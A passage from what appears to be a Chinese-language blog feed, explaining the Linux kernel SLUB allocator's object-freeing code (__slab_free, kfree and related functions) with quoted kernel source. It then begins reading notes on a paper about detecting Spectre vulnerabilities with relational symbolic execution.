class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 处理慢速路径. 这可能会被频繁调用因为在大部分情况下对象比cpu slab生命周期更长</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所以我们仍尝试减少缓存行的使用率. 拿取 slab lock 并释放对象即可.</span><br><span class="hljs-comment"> * 若不需要额外的 partial slab handling 我们便可立即返回.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>首先还是 kfence 和 debug 相关，如果该 <code>kmem_cache</code> 设置了 <code>SLAB_DEBUG_FLAGS</code> 标志位则直接调用 <code>free_to_partial_list()</code> 后返回即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后是一个 <code>do while</code> 循环，首先会将 <strong><code>待释放 freelist 所属 slab 的 freelist</code></strong> 连接到 <strong><code>待释放 freelist 的 tail object</code></strong> 后边，这里的 <code>new</code> 是一个栈上的临时 slab 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>接下来检查是否  <strong><code>(所有的对象都*将*为空闲对象 || 原 slab 上无空闲对象) &amp;&amp; slab 未被冻结</code></strong> ，若满足该条件则：</p><ul><li>检查是否有 percpu partial slab 且原 slab 上无空闲对象（即 slab-&gt;freelist（也就是代码中的 <code>prior</code>）为 NULL）：<ul><li>若是，则设置 slab 将被冻结（<code>new.frozen=1</code>）</li><li>若否，则获取 slab 所对应的 <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 之前不在链表上且将会部分为空</span><br><span class="hljs-comment"> * 我们可以推迟链表移动，而是反之将其冻结.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* 需要从一个链表上取下 */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 推测性地获取 list_lock.</span><br><span class="hljs-comment"> * 若 cmpxchg 未成功，则我们可能</span><br><span class="hljs-comment"> * 在不进行任何处理的情况下放弃 list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 否则 list_lock 将与其他处理器同步更新 slabs 链表</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>循环的终止条件用了一个 <code>cmpxchg_double_slab()</code> 函数，<del>套娃套得👴头昏眼花</del>，主要逻辑为：</p><ul><li><strong>对比 slab-&gt;freelist &#x3D;&#x3D; prior &amp;&amp; slab-&gt;counters &#x3D;&#x3D; counters，若是，则将 slab-&gt;freelist 设为 head 且将 slab-&gt;counters 设为 new.counters</strong>，该操作成功则返回 true，条件不符则返回 false</li></ul><p>成功了循环将会直接跳出：）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>接下来检查<strong>该 slab 是否需要从一个 <code>kmem_cache_node</code> 的链表上取下，若否，</strong>则：</p><ul><li>若 slab 已经被冻结，stat() 一下（基本上等于啥都不做）</li><li>若 slab 需要被冻结 （<code>new.frozen</code> 为 true），调用 <code>put_cpu_partial()</code> 直接将 slab 放到 percpu partial 链表</li><li>释放工作完成，返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 链表锁未被占用，因此不需要活跃任何链表.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 slab 上所有对象都被释放，且 node 上的 partial slab 数量已经超过 <code>kmem_cache-&gt;min_partial</code> ，<strong>这意味着这是一张完全空闲的 slab</strong>，接下来跳转到 <code>slab_empty</code> 标签，该标签对应代码块主要是：</p><ul><li>若 slab 上原来有空闲对象（位于 node partial 链表），则从 partial 链表移除</li><li>若 slab 上原来无空闲对象（位于 node full 链表），则从 full 链表移除</li><li><strong>最后调用 <code>discard_slab()</code> 释放这一张 slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, slab);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>若不满足上面的条件，则检查是否没有 percpu partial slab 且 slab 上原 freelist 为 NULL（即位于 node full 链表），若是则从 full 链表移除并添加到 node partial 链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Objects left in the slab. If it was not on the partial list before</span><br><span class="hljs-comment"> * then add it.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;<br>remove_full(s, n, slab);<br>add_partial(n, slab, DEACTIVATE_TO_TAIL);<br>stat(s, FREE_ADD_PARTIAL);<br>&#125;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br><span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure><p>至此， slub 算法的释放逻辑分析完毕</p><h2 id="二、kfree：通用的上层释放接口"><a href="#二、kfree：通用的上层释放接口" class="headerlink" title="二、kfree：通用的上层释放接口"></a>二、kfree：通用的上层释放接口</h2><p>正如同 <code>kmalloc()</code> 是最为通用的内核对象分配函数，与之相对应的释放函数便是 <code>kfree()</code> 了，这个函数其实主要就是 <code>__kmem_cache_free()</code> 的 wrapper，对于较大的对象则会用 <code>free_large_kmalloc()</code> 进行释放，如果 object 为 NULL 则直接返回：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * kfree - 释放之前分配的对象</span><br><span class="hljs-comment"> * @object: kmalloc 返回的指针.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若 @object 为 NULL, 则不会进行任何操作.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 不要释放不由 kmalloc() 分配的内存，否则会出问题.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">kfree</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">folio</span> *<span class="hljs-title">folio</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">s</span>;</span><br><br>trace_kfree(_RET_IP_, object);<br><br><span class="hljs-keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(object)))<br><span class="hljs-keyword">return</span>;<br><br>folio = virt_to_folio(object);<br><span class="hljs-keyword">if</span> (unlikely(!folio_test_slab(folio))) &#123;<br>free_large_kmalloc(folio, (<span class="hljs-type">void</span> *)object);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>slab = folio_slab(folio);<br>s = slab-&gt;slab_cache;<br>__kmem_cache_free(s, (<span class="hljs-type">void</span> *)object, _RET_IP_);<br>&#125;<br>EXPORT_SYMBOL(kfree);<br></code></pre></td></tr></table></figure><h3 id="I-folio-结构：一段物理、虚拟、逻辑上都连续的内存"><a href="#I-folio-结构：一段物理、虚拟、逻辑上都连续的内存" class="headerlink" title="I. folio 结构：一段物理、虚拟、逻辑上都连续的内存"></a>I. folio 结构：一段物理、虚拟、逻辑上都连续的内存</h3><p>注意到这里用了一个名为 <code>folio</code> 的结构体，其表示了<strong>一块物理、虚拟、逻辑上都连续的内存</strong>，  <em>其实本质上还是复用了 page 结构体，只不过这一次是将 page 转为 folio</em>  ，定义比较长这里就不贴代码了</p><p><code>virt_to_folio()</code> 首先会用 <code>virt_to_page()</code> 找到待释放对象虚拟地址对应的 <code>page</code> 结构体，之后用 <code>page_folio()</code> 将其转换为 folio 结构体——其实就是对于复合页而言会找到第一张页面，由此如果是复合页的话那说明是大 slab 所以会调用 <code>free_large_kmalloc()</code>，不是复合页说明是小 slab 所以会调用 <code>__kmem_cache_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">struct</span> folio *<span class="hljs-title function_">virt_to_folio</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *x)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> virt_to_page(x);<br><br><span class="hljs-keyword">return</span> page_folio(page);<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> page_folio(p)(_Generic((p),\</span><br><span class="hljs-meta">const struct page *:(const struct folio *)_compound_head(p), \</span><br><span class="hljs-meta">struct page *:(struct folio *)_compound_head(p)))</span><br></code></pre></td></tr></table></figure><p>然后 <code>folio_test_slab()</code> 其实是 <code>include/linux/page-flags.h</code> 里的拼接宏，这里就不深入展开了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">bool</span> folio_test_#<span class="hljs-meta">#lname(struct folio *folio)\</span><br><span class="hljs-meta">&#123; return test_bit(PG_##lname, folio_flags(folio, FOLIO_##policy)); &#125;\</span><br></code></pre></td></tr></table></figure><h3 id="II-free-large-kmalloc-：直接将页面释放回-buddy-system"><a href="#II-free-large-kmalloc-：直接将页面释放回-buddy-system" class="headerlink" title="II. free_large_kmalloc()：直接将页面释放回 buddy system"></a>II. free_large_kmalloc()：直接将页面释放回 buddy system</h3><p>正如对于大对象的分配 <code>kmalloc_large()</code> 会直接从 buddy system 请求内存一般，相对应的 <code>free_large_kmalloc()</code> 也会直接将页面释放回 buddy system：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">free_large_kmalloc</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> folio *folio, <span class="hljs-type">void</span> *object)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order = folio_order(folio);<br><br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(order == <span class="hljs-number">0</span>))<br>pr_warn_once(<span class="hljs-string">&quot;object pointer: 0x%p\n&quot;</span>, object);<br><br>kmemleak_free(object);<br>kasan_kfree_large(object);<br>kmsan_kfree_large(object);<br><br>mod_lruvec_page_state(folio_page(folio, <span class="hljs-number">0</span>), NR_SLAB_UNRECLAIMABLE_B,<br>      -(PAGE_SIZE &lt;&lt; order));<br>__free_pages(folio_page(folio, <span class="hljs-number">0</span>), order);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III-kmem-cache-free-：常规的释放函数"><a href="#III-kmem-cache-free-：常规的释放函数" class="headerlink" title="III. __kmem_cache_free()：常规的释放函数"></a>III. __kmem_cache_free()：常规的释放函数</h3><p><code>__kmem_cache_free()</code> 主要就是对 <code>slab_free()</code> 的 wrapper，不过会指定 tail 为 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __kmem_cache_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-type">void</span> *x, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> caller)<br>&#123;<br>slab_free(s, virt_to_slab(x), x, <span class="hljs-literal">NULL</span>, &amp;x, <span class="hljs-number">1</span>, caller);<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>slab_free()</code> 则会最终调用到 <code>do_slab_free()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __fastpath_inline <span class="hljs-type">void</span> <span class="hljs-title function_">slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,</span><br><span class="hljs-params">      <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">void</span> **p, <span class="hljs-type">int</span> cnt,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br>memcg_slab_free_hook(s, slab, p, cnt);<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * With KASAN enabled slab_free_freelist_hook modifies the freelist</span><br><span class="hljs-comment"> * to remove objects, whose reuse must be delayed.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (slab_free_freelist_hook(s, &amp;head, &amp;tail, &amp;cnt))<br>do_slab_free(s, slab, head, tail, cnt, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了一个函数 <code>slab_free_freelist_hook()</code>，主要的作用是遍历待释放的 freelist：</p><ul><li>如果设置了 free hook（ <code>slab_free_hook() == true</code> ），则仅减少计数以推迟释放</li><li>否则重新建立一遍 freelist 后返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">slab_free_freelist_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params">   <span class="hljs-type">void</span> **head, <span class="hljs-type">void</span> **tail,</span><br><span class="hljs-params">   <span class="hljs-type">int</span> *cnt)</span><br>&#123;<br><br><span class="hljs-type">void</span> *object;<br><span class="hljs-type">void</span> *next = *head;<br><span class="hljs-type">void</span> *old_tail = *tail ? *tail : *head;<br><br><span class="hljs-keyword">if</span> (is_kfence_address(next)) &#123;<br>slab_free_hook(s, next, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">/* Head and tail of the reconstructed freelist */</span><br>*head = <span class="hljs-literal">NULL</span>;<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>object = next;<br>next = get_freepointer(s, object);<br><br><span class="hljs-comment">/* If object&#x27;s reuse doesn&#x27;t have to be delayed */</span><br><span class="hljs-keyword">if</span> (!slab_free_hook(s, object, slab_want_init_on_free(s))) &#123;<br><span class="hljs-comment">/* Move object to the new freelist */</span><br>set_freepointer(s, object, *head);<br>*head = object;<br><span class="hljs-keyword">if</span> (!*tail)<br>*tail = object;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Adjust the reconstructed freelist depth</span><br><span class="hljs-comment"> * accordingly if object&#x27;s reuse is delayed.</span><br><span class="hljs-comment"> */</span><br>--(*cnt);<br>&#125;<br>&#125; <span class="hljs-keyword">while</span> (object != old_tail);<br><br><span class="hljs-keyword">if</span> (*head == *tail)<br>*tail = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">return</span> *head != <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="三、上层调用接口关系图-1"><a href="#三、上层调用接口关系图-1" class="headerlink" title="三、上层调用接口关系图"></a>三、上层调用接口关系图</h2><p>涉及到内存释放的函数相较于内存分配其实少很多，常用的主要就是 <code>kfree()</code>、<code>kfree_sensitive()</code>、<code>kmem_cache_free()</code> 这三大函数：</p><p><img src="https://s2.loli.net/2023/02/24/Itbqo2eO15yn7ZW.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="内存管理" scheme="https://arttnba3.github.io/tags/%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    
    <category term="slub allocator" scheme="https://arttnba3.github.io/tags/slub-allocator/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x01】论文笔记：Hunting the Haunter — Efficient Relational Symbolic Execution for Spectre with Haunted RelSE </title>
    <link href="https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/"/>
    <id>https://arttnba3.github.io/2023/01/29/PAPER-0X01-HUNTING_THE_HAUNTER-EFFICIENT_RELATIONAL_SYMBOLIC_EXECUTION_FOR_SPECTRE_WITH_HAUNTED_RELSE/</id>
    <published>2023-01-28T15:37:51.000Z</published>
    <updated>2023-04-23T16:40:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>鬼！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>本校在毕设之前还有个“小毕设”——<code>网络空间安全综合实验</code> ，刚好笔者要做的题目是基于这篇论文完成的，所以还是简单写一个阅读笔记：）</p><blockquote><p>说是笔记，其实还是差不多相当于把原文翻译了一遍（（（</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Spectre</strong> 是一种微架构层面的漏洞，其允许攻击者利用推测执行（speculation executino）技术中的漏洞来泄露信息，但对于该类型漏洞的检测面临着两个挑战：①推测路径带来的搜索空间爆炸②在不同编译阶段引入的 Spectre 漏洞</p><p>本文提出了在二进制级的 Spectre 漏洞的量化检测的优化方法：<code>Haunted RelSE</code>，并证明了相比于在最先进的工具中的更朴素的显式推测执行方法（more naive explicit speculative execution approach），该优化是语义正确的</p><p>研究者在一个符号分析工具中应用了 <code>Haunted RelSE</code> ，并在一个有名的 Spectre-PHT（Spectre v1） 的 litmus tester 上进行了测试，并打算在一个新的 Spectre-STL（Spectre v4）的 litmus tester 上测试</p><blockquote><p>litmus test：对内存一致性的测试</p><blockquote><p>好像没有啥中文翻译，相关的中文资料也少，摸了</p></blockquote></blockquote><p>该技术比最先进的工具发现了更多的 violations 与 scales，并让研究者发现：对 Spectre-PHT 的标准防护手段 <code>index-masking</code> 与著名的编译  <em>位置无关的可执行文件</em>  （position independent executables）的 gcc 选项，导致了 Spectre-STL 的引入</p><p>研究者提出并验证了一种对 <code>index-masking</code> 的修正方法</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>现代 CPU 的执行速度依赖于包括分支预测器（branch predictor）与 <em>投机</em> （ <em>speculation</em> ）在内的复杂硬件逻辑：提前执行指令 &amp; 尝试通过分支预测器来推测执行（speculatively execute）一条控制流，若推测失败则恢复被影响区域——称为  <em>恢复执行</em> （Reverted execution，也叫做 <em>瞬态执行</em> （transient execution），意为从架构角度来看这个操作是透明的）</p><p>但瞬态执行会在微架构级（microarchitecture）留下可观测的侧面影响（side effects），而这可以被攻击者用以恢复架构级（architectural）的秘密——这种攻击手法称之为<strong>幽灵攻击</strong>（Spectre attacks）</p><p>幽灵有着<a href="https://transient.fail/">多种变种</a>，但绝大部分的工作都仅关注于  <code>Spectre-v1</code> （Pattern History Table，对条件分支的攻击），仅有 <a href="https://arxiv.org/pdf/1910.01755.pdf">Pitchfork</a> 做了 <code>Spectre-v4</code> （Store to Load，对内存屏障预测器的攻击）的相关工作，但并不完善</p><h4 id="Goal-and-Challenge"><a href="#Goal-and-Challenge" class="headerlink" title="Goal and Challenge"></a>Goal and Challenge</h4><p>本篇论文中研究者提出了一种用以检测 <code>Spectre-PHT</code> 与 <code>Spectre-STL</code> 漏洞的方法，并应用于静态二进制代码分析中，这面临着两个挑战：</p><ul><li><strong>C1</strong>：微架构的细节在分析中无法被完全获得，需要一种足够强大的提取方法以提取造成侧信道攻击的微架构状态（mocroarchitectural state）</li><li><strong>C2</strong>：对可能的推测执行的探索的规模不能太大，否则会造成状态爆炸（state explosion）</li></ul><h4 id="Proposal"><a href="#Proposal" class="headerlink" title="Proposal"></a>Proposal</h4><p>本文通过在文献中创造的  <em>关系安全属性</em>  （relational security property）作为  <em>推测常数时间</em>  （speculative constant-time）来应对挑战 C1。推测常数时间在没有详细建模复杂的微架构细节的情况下将推测执行纳入考虑，但编译器没必要保护常数时间编程（constant-time programming），故我们的分析在二进制层操作（无需源码）。本文将前人的模型扩展到常数时间二进制分析上，以分析  <em>推测常数时间</em>  </p><p><strong>符号执行</strong>（symbolic execution）是一项在二进制代码上扩展良好的技术，但为了分析推测常数时间，其必须考虑程序的推测行为。Spectre-PHT 与 Spectre-STL 的符号分析者通过 fork 